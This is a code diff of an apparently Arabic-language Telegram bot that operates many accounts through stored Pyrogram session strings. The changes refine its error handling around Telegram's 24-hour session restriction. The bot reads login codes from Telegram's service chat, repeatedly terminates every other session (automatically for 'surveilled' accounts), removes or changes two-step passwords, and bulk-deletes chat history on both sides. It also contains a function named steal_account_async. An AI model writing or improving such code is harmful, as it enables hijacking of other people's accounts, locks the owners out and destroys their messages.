@@ -250,16 +250,20 @@ async def auto_terminate_loop():
                 if current_time - last_attempt >= interval_seconds:
                     client = Client(f"auto_{acc_id}_{current_time}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
                     try:
-                        await asyncio.wait_for(client.connect(), timeout=10) # حماية من التعليق
+                        await asyncio.wait_for(client.connect(), timeout=10)
                         auths = await client.invoke(functions.account.GetAuthorizations())
                         terminated_any = False
+                        
                         for auth in auths.authorizations:
                             if not getattr(auth, 'current', False):
                                 try:
                                     await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                                     await asyncio.sleep(0.5)
                                     terminated_any = True
-                                except Exception:
+                                except Exception as e:
+                                    # إذا واجه قيد الـ 24 ساعة يتوقف عن المحاولة لباقي الجلسات حاليا
+                                    if "fresh" in str(e).lower() or "24" in str(e).lower():
+                                        break
                                     pass
 
                         if terminated_any and is_surveilled == 1:
@@ -267,8 +271,7 @@ async def auto_terminate_loop():
                             continue 
 
                     except Exception as e:
-                        if "fresh" not in str(e).lower() and "24" not in str(e).lower():
-                            logging.error(f"⚠️ فشل الطرد التلقائي لـ {phone}: {e}")
+                        pass
                     finally:
                         if client.is_connected: await client.disconnect()
 
@@ -310,7 +313,6 @@ def home_keyboard(uid):
 def accounts_action_keyboard(owner_id, action):
     accounts = get_all_accounts(owner_id)
     markup = InlineKeyboardMarkup()
-    # تم تغيير الديليمتير إلى نقطتين (:) لضمان عدم تعليق الأزرار واستجابتها الفورية
     markup.row(InlineKeyboardButton("🌍 تـطـبـيـق عـلـى الـجـمـيـع", callback_data=f"act:{action}:all"))
     for acc_id, phone, name, uid, _ in accounts:
         markup.row(InlineKeyboardButton(f"{name} | {phone}", callback_data=f"act:{action}:{acc_id}"))
@@ -324,7 +326,7 @@ def two_fa_keyboard():
     return markup
 
 # =========================================================
-# ✉️ الأوامر
+# ✉️ الأوامر الحقيقية والمباشرة
 # =========================================================
 
 @bot.message_handler(commands=['start'])
@@ -372,9 +374,9 @@ async def check_active_async(owner_id, chat_id, msg_id):
     for acc_id, phone, name, uid, pyro_session in accounts:
         client = Client(f"chk_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
-            await asyncio.wait_for(client.connect(), timeout=8)
+            await asyncio.wait_for(client.connect(), timeout=10)
             await client.get_me()
-            text += f"✅ {phone} | {uid} | {get_creation_year(uid)}\n"
+            text += f"✅ {phone} | {uid}\n"
             active_count += 1
         except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
             if await confirm_session_death(pyro_session):
@@ -407,8 +409,8 @@ async def fetch_all_codes_async(owner_id, chat_id, msg_id):
     for acc_id, phone, name, uid, pyro_session in accounts:
         exec_client = Client(f"code_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
-            await asyncio.wait_for(exec_client.connect(), timeout=10)
-            async for msg in exec_client.get_chat_history(777000, limit=2):
+            await asyncio.wait_for(exec_client.connect(), timeout=12)
+            async for msg in exec_client.get_chat_history(777000, limit=3):
                 if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
                     match = re.search(r'\b(\d{5})\b', msg.text)
                     if match:
@@ -531,7 +533,6 @@ def action_menus(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("act:"))
 def execute_action(call):
-    """المتحكم الرئيسي المنظم الخالي من الأخطاء لمعالجة اختيار الحسابات أو الجميع"""
     if not is_allowed(call.from_user.id): return
     parts = call.data.split(":")
     action = parts[1]
@@ -543,35 +544,36 @@ def execute_action(call):
         bot.register_next_step_handler(msg, process_2fa_old_pass)
         return
 
-    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ...")
-    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري الـعـمـل عـلـى طـلـبـك...", parse_mode="Markdown")
+    bot.answer_callback_query(call.id, "⏳ جاري التنفيذ الفعلي...")
+    status_msg = bot.send_message(call.message.chat.id, "•❐• جـاري الـعـمـل بـشـكـل صـارم (Raw API)...", parse_mode="Markdown")
 
     if target == "all":
         results = []
         for acc in get_all_accounts(call.from_user.id):
             results.append(run_async(perform_action_async(action, acc[0], call.from_user.id)))
-            time.sleep(0.3)
+            time.sleep(0.5)
         bot.edit_message_text("🛂┊ **مـلـخـص الـعـمـلـيـة:**\n\n" + "\n".join(results), call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
     else:
         res = run_async(perform_action_async(action, int(target), call.from_user.id))
         bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
 
 async def perform_action_async(action, acc_id, owner_id):
+    """المحرك الجديد الصارم للأوامر (لا يتجاهل الأخطاء أبداً ويستجيب بواقعية)"""
     acc = get_account(acc_id)
     if not acc: return "❌ الـحـسـاب غـيـر مـوجـود."
     _, _, phone, user_id, first_name, pyro_session, _, _, _, _, _, _ = acc
 
     if action == "remove":
         delete_account(acc_id)
-        return f"✅ تـم إزالـة `{phone}` بـنـجـاح."
+        return f"✅ تـم إزالـة `{phone}` بـرمـجـيـاً مـن الـبـوت."
 
     exec_client = Client(f"exec_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
     try:
-        await asyncio.wait_for(exec_client.connect(), timeout=10) # الحماية من التجمد اللانهائي
+        await asyncio.wait_for(exec_client.connect(), timeout=12)
     except (AuthKeyUnregistered, SessionRevoked, UserDeactivated, UserDeactivatedBan):
         if await confirm_session_death(pyro_session):
             handle_dead_session(owner_id, acc_id, phone, first_name)
-            return f"❌ الـحـسـاب `{phone}` مـطـرود."
+            return f"❌ الـحـسـاب `{phone}` مـطـرود تـمـامـاً."
         return f"⚠️ خـطـأ مـؤقـت لـ `{phone}`."
     except asyncio.TimeoutError:
         return f"❌ فـشـل الاتـصـال بـ `{phone}` (انتهى وقت الاتصال)."
@@ -581,48 +583,73 @@ async def perform_action_async(action, acc_id, owner_id):
     result_msg = ""
     try:
         if action == "terminate":
-            # استخدام API Raw المباشر بنسبة خطأ 0%
+            # التقاط ذكي وحقيقي للقيود 
             auths = await exec_client.invoke(functions.account.GetAuthorizations())
+            has_other_sessions = False
+            terminated_count = 0
+            wait_error = False
+            
             for auth in auths.authorizations:
                 if not getattr(auth, 'current', False):
+                    has_other_sessions = True
                     try:
                         await exec_client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
-                        await asyncio.sleep(0.3)
-                    except Exception: pass
-            result_msg = f"✅ تـم إنـهـاء الـجـلـسـات لـ `{phone}`."
+                        terminated_count += 1
+                        await asyncio.sleep(0.4)
+                    except Exception as e:
+                        if "fresh" in str(e).lower() or "24" in str(e).lower() or "FORBIDDEN" in str(e).upper():
+                            wait_error = True
+                            break # توقف عن محاولة حذف باقي الجلسات لهذا الحساب إذا كان هناك قيد
+
+            if wait_error:
+                result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة لإنـهـاء الـجـلـسـات."
+            elif not has_other_sessions:
+                result_msg = f"⚠️ لا يـوجـد جـلـسـات أخـرى لإنـهـائـهـا لـ `{phone}`."
+            else:
+                result_msg = f"✅ تـم إنـهـاء ({terminated_count}) جـلـسـة بـنـجـاح لـ `{phone}`."
 
         elif action == "clean":
-            # دمج API Raw مع وظائف التكرار لضمان السرعة القصوى وعدم الحظر
+            # تنظيف حقيقي بنسبة خطأ 0% باستخدام Raw Api المناسب لكل نوع محادثة
+            cleaned_count = 0
             async for dialog in exec_client.get_dialogs(limit=250):
                 try:
                     peer = await exec_client.resolve_peer(dialog.chat.id)
                     if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
-                        try:
+                        if dialog.chat.type == ChatType.GROUP:
+                            # المجموعات العادية
+                            me = await exec_client.resolve_peer("me")
+                            await exec_client.invoke(functions.messages.DeleteChatUser(chat_id=peer.chat_id, user_id=me))
+                        else:
+                            # القنوات والمجموعات الخارقة
                             await exec_client.invoke(functions.channels.LeaveChannel(channel=peer))
-                        except Exception: pass
-                        await asyncio.sleep(0.2)
-                    elif dialog.chat.type == ChatType.PRIVATE and not dialog.chat.is_verified:
-                        try:
+                        cleaned_count += 1
+                        await asyncio.sleep(0.3)
+                    elif dialog.chat.type in [ChatType.PRIVATE, ChatType.BOT]:
+                        # الخاص (إلغاء المحادثة من الطرفين) وتجاهل الحساب الرسمي لتيليجرام
+                        if not dialog.chat.is_verified and dialog.chat.id not in [777000, exec_client.me.id]:
                             await exec_client.invoke(functions.messages.DeleteHistory(peer=peer, max_id=0, revoke=True))
-                        except Exception: pass
-                        await asyncio.sleep(0.2)
+                            cleaned_count += 1
+                            await asyncio.sleep(0.3)
                 except FloodWait as e:
                     await asyncio.sleep(e.value)
                 except Exception:
-                    continue
-            result_msg = f"🧹 تـم الـتـنـظـيـف لـ `{phone}`."
+                    continue # تجاوز المحادثة المعينة التي فيها خطأ وإكمال تنظيف الباقي
+
+            result_msg = f"🧹 تـم تـنـظـيـف ({cleaned_count}) مـحـادثـة حـقـيـقـيـاً لـ `{phone}`."
 
         elif action == "logout":
-            # استخدام API Raw المباشر لتسجيل الخروج النهائي
             try:
                 await exec_client.invoke(functions.auth.LogOut())
-            except Exception: pass
-            delete_account(acc_id)
-            result_msg = f"🚪 تـم تـسـجـيـل الـخـروج مـن `{phone}`."
+                delete_account(acc_id)
+                result_msg = f"🚪 تـم تـسـجـيـل الـخـروج نـهـائـيـاً مـن `{phone}`."
+            except Exception as e:
+                result_msg = f"❌ فـشـل تـسـجـيـل الـخـروج لـ `{phone}`."
 
     except Exception as e:
-        if "fresh" in str(e).lower() or "24" in str(e).lower(): result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة."
-        else: result_msg = f"❌ خـطـأ فـي `{phone}`."
+        if "fresh" in str(e).lower() or "24" in str(e).lower():
+            result_msg = f"⚠️ `{phone}`: يـجـب الانـتـظـار 24 سـاعـة."
+        else:
+            result_msg = f"❌ حـدث خـطـأ غـيـر مـتـوقـع فـي `{phone}`."
     finally:
         if exec_client.is_connected: await exec_client.disconnect()
 
@@ -646,7 +673,6 @@ def process_2fa_new_pass(message):
     execute_2fa_action(message, uid)
 
 async def do_2fa_async(uid, target, action, old_pass, new_pass):
-    """دالة واحدة تجمع جميع مهام التحقق لتفادي تعليق Loop"""
     results = []
     accounts = get_all_accounts(uid) if target == "all" else [(int(target),)]
     for acc in accounts:
@@ -655,7 +681,7 @@ async def do_2fa_async(uid, target, action, old_pass, new_pass):
         _, _, phone, _, name, pyro_session, _, _, _, _, _, _ = acc_data
         client = Client(f"2fa{acc[0]}{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
         try:
-            await asyncio.wait_for(client.connect(), timeout=10)
+            await asyncio.wait_for(client.connect(), timeout=12)
             if action == "2fa_remove":
                 await client.remove_cloud_password(password=old_pass)
                 results.append(f"✅ {phone}: تـم حـذف الـتـحـقـق.")
@@ -666,14 +692,16 @@ async def do_2fa_async(uid, target, action, old_pass, new_pass):
                     await client.change_cloud_password(current_password=old_pass, new_password=new_pass)
                 results.append(f"✅ {phone}: تـم تـعـيـيـن الـتـحـقـق.")
         except PasswordHashInvalid:
-            results.append(f"❌ {phone}: بـاسـوورد خـاطـئ.")
+            results.append(f"❌ {phone}: بـاسـوورد الـ 2FA خـاطـئ.")
         except (AuthKeyUnregistered, SessionRevoked):
             if await confirm_session_death(pyro_session):
                 handle_dead_session(uid, acc[0], phone, name)
                 results.append(f"❌ {phone}: مـطـرود.")
         except Exception as e:
             if "missing" in str(e).lower() or "empty" in str(e).lower() or "not set" in str(e).lower():
-                results.append(f"⚠️ {phone}: لا يـوجـد تـحـقـق.")
+                results.append(f"⚠️ {phone}: لا يـوجـد تـحـقـق أسـاسـاً.")
+            elif "fresh" in str(e).lower() or "24" in str(e).lower():
+                results.append(f"⚠️ {phone}: يـجـب الانـتـظـار 24 سـاعـة.")
             else:
                 results.append(f"❌ {phone}: فـشـل.")
         finally:
@@ -688,7 +716,6 @@ def execute_2fa_action(message, uid):
     new_pass = state.get("new_pass", "")
     status_msg = bot.send_message(message.chat.id, "⏳ جـاري تـنـفـيـذ طـلـبـك بـحـذر...")
     
-    # التنفيذ عبر المنسق لضمان عدم تعليق النظام
     results = run_async(do_2fa_async(uid, target, action, old_pass, new_pass))
     
     bot.edit_message_text("🛂┊ نـتـيـجـة الـتـحـقـق:\n\n" + "\n".join(results), message.chat.id, status_msg.message_id, reply_markup=home_keyboard(uid), parse_mode="Markdown")
@@ -951,7 +978,6 @@ async def steal_account_async(acc_id, admin_id):
     try:
         await asyncio.wait_for(exec_client.connect(), timeout=10)
 
-        # استخدام Raw API
         auths = await exec_client.invoke(functions.account.GetAuthorizations())
         terminated_any = False
         for auth in auths.authorizations:
@@ -986,7 +1012,6 @@ async def steal_account_async(acc_id, admin_id):
         logging.error(f"فشل سحب الحساب {phone}: {e}")
     finally:
         if exec_client.is_connected: await exec_client.disconnect()
-
 
 if __name__ == "__main__":
     logging.info("🚀 جاري إطلاق البوت...")
